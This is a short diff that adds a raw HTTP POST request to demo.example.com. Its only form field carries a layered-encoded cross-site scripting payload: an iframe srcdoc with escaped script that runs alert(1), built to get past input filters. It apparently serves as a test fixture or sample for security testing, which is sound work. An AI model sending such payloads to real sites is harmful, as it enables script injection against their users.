@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 117
+Connection: close
+
+q=\u003Ciframe srcdoc=\u0022\u0026lt\u003Bscript\u0026gt\u003Balert(1)\u0026lt\u003B/script\u0026gt\u003B\u0022\u003E
